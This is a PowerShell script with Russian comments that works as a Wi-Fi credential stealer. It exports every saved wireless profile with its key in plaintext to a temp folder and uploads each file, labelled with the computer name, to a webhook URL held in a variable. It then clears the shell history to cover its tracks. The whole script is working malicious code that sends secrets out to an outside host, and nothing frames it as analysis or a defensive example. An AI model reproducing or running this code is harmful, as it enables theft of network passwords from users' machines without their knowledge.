# Каталог для экспорта
$exportDir = "$env:temp\SomeStuff"

# Убедитесь, что каталог для экспорта существует
if (-not (Test-Path $exportDir)) {
    try {
        # Создайте каталог для экспорта, если он не существует
        New-Item -ItemType Directory -Path $exportDir -Force
    } catch {
        # Выведите сообщение об ошибке при создании каталога для экспорта
        Write-Host "Ошибка при создании каталога для экспорта: $_"
        return
    }
}

# Экспортируйте профили Wi-Fi (включая ключи)
try {
    # Экспортируйте профили Wi-Fi в каталог для экспорта
    netsh wlan export profile key=clear folder=$exportDir
} catch {
    # Выведите сообщение об ошибке при экспорте профилей Wi-Fi
    Write-Host "Ошибка при экспорте профилей Wi-Fi: $_"
    return
}

# Прочитайте все экспортированные файлы XML
$xmlFiles = Get-ChildItem -Path $exportDir -Filter "*.xml"
if ($xmlFiles.Count -eq 0) {
    # Выведите сообщение, если не найдены экспортированные профили Wi-Fi
    Write-Host "Не найдены экспортированные профили Wi-Fi."
    return
}

# Отправьте запрос вебхука с загрузкой файла
foreach ($xmlFile in $xmlFiles) {
    # Прочитайте содержимое файла
    $fileContent = Get-Content -Path $xmlFile.FullName -Raw

    # Подготовьте данные
    $formData = @{
        "username" = "$env:COMPUTERNAME"
        "content"  = "Вот профиль Wi-Fi: $($xmlFile.Name)"
    }

    $formDataFiles = @{
        "file" = New-Object System.IO.FileInfo($xmlFile.FullName)
    }

    # Установите заголовок для multipart/form-data
    $boundary = [System.Guid]::NewGuid().ToString()
    $contentType = "multipart/form-data; boundary=$boundary"
    $body = ""

    # Добавьте данные
    foreach ($key in $formData.Keys) {
        $body += "--$boundary`r`n"
        $body += "Content-Disposition: form-data; name=`"$key`"`r`n"
        $body += "`r`n"
        $body += "$($formData[$key])`r`n"
    }

    # Добавьте файл
    $body += "--$boundary`r`n"
    $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$($formDataFiles['file'].Name)`"`r`n"
    $body += "Content-Type: application/octet-stream`r`n"
    $body += "`r`n"
    $body += [System.IO.File]::ReadAllText($formDataFiles['file'].FullName)
    $body += "`r`n"
    $body += "--$boundary--`r`n"

    # Преобразуйте тело в байтовые данные
    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)

    # Отправьте запрос
    try {
        # Укажите новый URL вебхука через прокси
        $response = Invoke-RestMethod -Uri $whuri -Method Post -Body $bodyBytes -Headers @{
            "Content-Type" = $contentType
        }
        # Выведите сообщение об успешной отправке
        Write-Host "Успешно отправлено на вебхук: $($xmlFile.Name)"
    } catch {
        # Выведите сообщение об ошибке при отправке
        Write-Host "Ошибка при отправке на вебхук: $_"
    }
}

# Очистите историю
Clear-History